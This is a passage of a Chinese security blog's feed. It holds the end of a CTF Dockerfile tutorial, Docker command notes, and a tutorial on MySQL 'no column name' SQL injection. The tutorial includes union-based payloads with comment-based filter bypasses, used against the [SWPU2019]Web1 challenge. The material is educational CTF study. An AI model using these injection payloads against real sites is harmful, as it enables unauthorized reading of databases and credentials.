&#x2F;readflag</span><br><span class="line">chmod 400 &#x2F;flag</span><br><span class="line"></span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>首先将环境变量<code>$FLAG</code>写入到<code>/flag</code>中，之后进行权限配置：</p><p>1.chmod u+s /readflag ： 为<code>/readflag</code>文件加上setuid标志，设置使文件在执行阶段具有文件所有者的权限</p><p>2.chmod 400 /flag ：将<code>flag</code>文件权限设为文件拥有者只读，群组和其他用户没有任何权限</p><p>那么执行<code>./readflag</code>时，就会拥有文件所有者的权限，可以读取<code>/flag</code>了</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>flag.sh：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># 修改数据库中的 FLAG</span><br><span class="line">mysql -e &quot;CREATE DATABASE IF NOT EXISTS supersqli;USE supersqli; CREATE TABLE IF NOT EXISTS \&#96;1919810931114514\&#96; (\&#96;flag\&#96; varchar(100) NOT NULL) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8;INSERT INTO \&#96;1919810931114514\&#96; VALUES (&#39;$FLAG&#39;);&quot; -uroot -proot</span><br><span class="line"></span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br><span class="line"></span><br><span class="line">rm -f &#x2F;flag.sh</span><br></pre></td></tr></table></figure><h3 id="0x-05-打包镜像到Docker-Hub"><a href="#0x-05-打包镜像到Docker-Hub" class="headerlink" title="0x 05 打包镜像到Docker Hub"></a>0x 05 打包镜像到Docker Hub</h3><p>为了方便搜索和下载自己编写的镜像，可以通过以下步骤来实现：</p><p>1.到<code>https://hub.docker.com/</code>注册一个账号</p><p>2.登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login -u 用户名 -p 密码</span><br></pre></td></tr></table></figure><p>3.更改镜像标签，格式为<code>用户名/标签名</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag test 用户名&#x2F;镜像名</span><br></pre></td></tr></table></figure><p>4.推送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push 用户名&#x2F;镜像名</span><br></pre></td></tr></table></figure><p>5.登出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logout</span><br></pre></td></tr></table></figure><p>这时就可以在Docker Hub上找到刚上传的镜像了，将其添加描述后就能使用<code>docker search</code>搜索到自己的镜像</p><h3 id="0x-06-ctfd平台部署"><a href="#0x-06-ctfd平台部署" class="headerlink" title="0x 06 ctfd平台部署"></a>0x 06 ctfd平台部署</h3><p>参考这几篇文章：</p><p><a href="https://www.zhaoj.in/read-6333.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6333.html</a></p><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756" target="_blank" rel="noopener">https://blog.csdn.net/fjh1997/article/details/100850756</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NjE0Mzk2OA==&amp;mid=2648922692&amp;idx=1&amp;sn=6f27333cf2f12008d62bfd94bc1d2f6a&amp;chksm=8772364bb005bf5d8d377a575fe4730f35235ff43ab597f8e5f17603da4801fab74e402a8916&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570805873725&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA3NjE0Mzk2OA==&amp;mid=2648922692&amp;idx=1&amp;sn=6f27333cf2f12008d62bfd94bc1d2f6a&amp;chksm=8772364bb005bf5d8d377a575fe4730f35235ff43ab597f8e5f17603da4801fab74e402a8916&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570805873725&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd</a></p><h3 id="0x-07-docker-compose"><a href="#0x-07-docker-compose" class="headerlink" title="0x 07 docker-compose"></a>0x 07 docker-compose</h3><p>docker-compose.yml：告诉docker-compose该怎么编排一组服务</p><p><img src="/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/image-20200322224722173.png" alt></p><p>参考链接：</p><blockquote><p><a href="https://www.cnblogs.com/zpcoding/p/11450686.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpcoding/p/11450686.html</a></p><p><a href="https://www.cnblogs.com/fundebug/p/write-excellent-dockerfile.html" target="_blank" rel="noopener">https://www.cnblogs.com/fundebug/p/write-excellent-dockerfile.html</a></p><p><a href="http://www.gtfly.top/2020/03/12/2019-09-27-CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99/" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-09-27-CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-前言&quot;&gt;&lt;a href=&quot;#0x-01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x 01 前言&quot;&gt;&lt;/a&gt;0x 01 前言&lt;/h3&gt;&lt;p&gt;​        镜像的定制实际上就是定制每一层所添加的配置文件，如果我们可以把每一层的修改
      
    
    </summary>
    
    
      <category term="基础知识" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="dockerfile编写" scheme="http://yoursite.com/tags/dockerfile%E7%BC%96%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>docker学习笔记</title>
    <link href="http://yoursite.com/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-22T07:43:39.000Z</published>
    <updated>2020-03-22T08:07:52.562Z</updated>
    
    <content type="html"><![CDATA[<h3 id="docker简介"><a href="#docker简介" class="headerlink" title="docker简介"></a>docker简介</h3><ul><li>Docker是一个新的容器化的技术，容器有效的将单个操作系统管理的资源划分到孤立的组中，以便更好的在孤立的组之间平衡有冲突的资源使用需求。</li><li>Docker 容器本质上是宿主机上的一个进程。Docker 通过 namespace 实现了资源隔离，通过 cgroups 实现了资源的限制，通过写时复制机制（copy-on-write）实现了高效的文件操作。 </li><li>Docker有五个命名空间：进程、网络、挂载、宿主和共享内存，为了隔离有问题的应用，Docker运用Namespace将进程隔离，为进程或进程组创建已隔离的运行空间，为进程提供不同的命名空间视图。这样，每一个隔离出来的进程组，对外就表现为一个container(容器)。</li></ul><h3 id="镜像和容器"><a href="#镜像和容器" class="headerlink" title="镜像和容器"></a>镜像和容器</h3><ul><li><p>Image: 镜像是一种轻量级、可执行的独立软件包，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p></li><li><p>Container:容器是镜像的运行时实例 - 实际执行时镜像会在内存中变成什么。默认情况下，它完全独立于主机环境运行，仅在配置为访问主机文件和端口的情况下才执行此操作。</p></li><li><p><code>容器 = 镜像 + 读写层</code></p><p>容器可以获取本机访问，每个容器都在独立进程中运行，占用的内存不超过任何其他可执行文件。</p></li></ul><p><img src="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200322154938724.png" alt="image-20200322154938724"></p><p><img src="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200322155027373.png" alt="image-20200322155027373"></p><h3 id="Docker的使用"><a href="#Docker的使用" class="headerlink" title="Docker的使用"></a>Docker的使用</h3><h4 id="启动和放入启动项"><a href="#启动和放入启动项" class="headerlink" title="启动和放入启动项"></a>启动和放入启动项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#centos7.0版本</span><br><span class="line">systemctl start docker </span><br><span class="line">systemctl enable docker</span><br><span class="line"></span><br><span class="line">#兼容老版本</span><br><span class="line">service docker start</span><br><span class="line">chkconfig docker on</span><br></pre></td></tr></table></figure><h4 id="image相关操作"><a href="#image相关操作" class="headerlink" title="image相关操作"></a>image相关操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">docker search [镜像]      #搜索镜像</span><br><span class="line">docker pull [镜像]        #下载镜像</span><br><span class="line">docker run -p 4000:80 username&#x2F;repository:tag #从远程镜像仓库中拉取并运行镜像</span><br><span class="line"></span><br><span class="line">sudo docker pull ubuntu:12.04 等同于</span><br><span class="line">docker pull registry.hub.docker.com&#x2F;ubuntu:12.04 </span><br><span class="line"></span><br><span class="line">docker push [镜像]            #发布镜像</span><br><span class="line">docker rmi [镜像]             #删除镜像</span><br><span class="line">docker images                 #查看本地镜像(列目录)</span><br><span class="line">docker images    -q           #只显示镜像ID</span><br><span class="line">docker history [镜像]         #历史镜像</span><br><span class="line">docker tag [镜像] username&#x2F;repository:tag #标记镜像</span><br><span class="line"></span><br><span class="line">docker rmi $(docker images -q)      #删除所有停止的镜像</span><br><span class="line">docker rmi -f $(docker images -q)   #强制删除所有的镜像</span><br></pre></td></tr></table></figure><h4 id="容器相关操作"><a href="#容器相关操作" class="headerlink" title="容器相关操作"></a>容器相关操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#创建容器</span><br><span class="line">docker run [镜像] &#x2F;bin&#x2F;echo hello world       #输出hello world</span><br><span class="line">docker run -i -t [镜像] &#x2F;bin&#x2F;bash             #交互式进入容器 #-i: 以交互模式运行容器  -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">docker run [镜像]  apt-get install -y app_name    #在容器安装新的程序</span><br><span class="line"></span><br><span class="line">docker exec -it kali &#x2F;bin&#x2F;bash          #进入容器</span><br><span class="line">docker run -it -d kali                  #启动容器，后台运行 #-d: 后台运行容器，并返回容器ID；</span><br><span class="line">docker run -it -p 53:53 kali            #启动容器的时候可以映射端口 #-p: 端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line"></span><br><span class="line">#进入交互式界面</span><br><span class="line">进入容器：</span><br><span class="line">sudo docker ps -a</span><br><span class="line">sudo docker exec -it [容器ID] &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">#查看容器</span><br><span class="line">docker ps                   #列出当前运行的容器</span><br><span class="line">docker ps -a                #列出所有的容器</span><br><span class="line">docker ps -l                #列出最近一次启动的容器</span><br><span class="line">docker ps -a -q             #查看所有的容器ID</span><br><span class="line"></span><br><span class="line">#容器操作</span><br><span class="line">docker inspect [容器名字]&#x2F;ID        #显示容器信息</span><br><span class="line">docker start [容器名字]&#x2F;ID      #启动容器</span><br><span class="line">docker stop [容器名字]&#x2F;ID       #停止容器</span><br><span class="line">docker kill [容器名字]&#x2F;ID       #杀死容器</span><br><span class="line">docker restart [容器名字]&#x2F;ID        #重新启动容器</span><br><span class="line">docker attach [容器名字]&#x2F;ID     #进入容器</span><br><span class="line">docker logs [容器名字]&#x2F;ID       #查看容器日志</span><br><span class="line">docker diff [容器名字]&#x2F;ID       #查看容器修改操作</span><br><span class="line">docker top [容器名字]&#x2F;ID            #显示容器进程信息</span><br><span class="line">docker cp ID:&#x2F;path to_path      #从容器中拷贝数据到本地</span><br><span class="line">docker cp [容器名字]:&#x2F;path to_path  #从容器中拷贝数据到本地</span><br><span class="line"></span><br><span class="line">#删除容器</span><br><span class="line">docker rm [容器]&#x2F;ID       #删除容器</span><br><span class="line">docker rm $(docker ps -a -q)    #删除所有停止的容器</span><br><span class="line">docker rm -f $(docker ps -a -q) #强制删除所有的容器</span><br></pre></td></tr></table></figure><p>参考链接：</p><blockquote><p><a href="https://www.smi1e.top/docker-%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/docker-%e7%ac%94%e8%ae%b0/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;docker简介&quot;&gt;&lt;a href=&quot;#docker简介&quot; class=&quot;headerlink&quot; title=&quot;docker简介&quot;&gt;&lt;/a&gt;docker简介&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Docker是一个新的容器化的技术，容器有效的将单个操作系统管理的资源划分到孤立
      
    
    </summary>
    
    
      <category term="基础知识" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="docker" scheme="http://yoursite.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>MySQL无列名注入</title>
    <link href="http://yoursite.com/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-22T03:46:33.000Z</published>
    <updated>2020-03-22T15:30:47.122Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-简介"><a href="#0x-01-简介" class="headerlink" title="0x 01 简介"></a>0x 01 简介</h3><p>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p><p>在 mysql =&gt; 5 的版本中存在一个名为  information_schema 的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli  中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。</p><p>当我们通过暴力破解获取到表名后，如何利用呢？</p><p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p><h3 id="0x-02-使用条件-amp-方法"><a href="#0x-02-使用条件-amp-方法" class="headerlink" title="0x 02 使用条件&amp;方法"></a>0x 02 使用条件&amp;方法</h3><p> <strong>使用条件&amp;方法</strong></p><p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</p><p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p><p> <strong>不使用表名查询</strong></p><p>正常的 sql 查询如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;admin&#96;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200221120103425.png" alt></p><p>其中，列名为 id、name、password，使用 union 查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from admin;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200221120025502.png" alt></p><p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;3&#96; from (select 1,2,3 union select * from admin)a;</span><br></pre></td></tr></table></figure><p>末尾的 a 可以是任意字符，用于命名。</p><p>当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><p>同时查询多个列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(&#96;2&#96;,0x2d,&#96;3&#96;) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322230016384.png" alt></p><p>简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。</p><p>payload：<code>select a,b from posts where a=-1 union select 1,(select concat(</code>3<code>,0x2d,</code>4<code>) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</code></p><h3 id="0x-03-例题分析"><a href="#0x-03-例题分析" class="headerlink" title="0x 03 例题分析"></a>0x 03 例题分析</h3><h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><ol><li>注入点在广告名。点击广告详情，发现数据库的报错信息，证明存在注入。</li></ol><p>简单测试了一下，空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。</p><p>首先测试字段数量,有22个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line">#group by获取列数</span><br><span class="line">-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;11</span><br></pre></td></tr></table></figure><p>查看数据库版本信息,是MariaDB</p><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322231728123.png" alt></p><p>由于过滤了or,所以用mysql.innodb_table_stats查询数据表或者用sys.schema_auto_increment_columns</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322232338100.png" alt></p><p>查询users表，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322232819155.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-简介&quot;&gt;&lt;a href=&quot;#0x-01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x 01 简介&quot;&gt;&lt;/a&gt;0x 01 简介&lt;/h3&gt;&lt;p&gt;顾名思义，就是在不知道列名的情况下进行 sql 注入。&lt;/p&gt;
&lt;p&gt;在 mysql =&amp;g
      
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="MySQL无列名注入" scheme="http://yoursite.com/tags/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
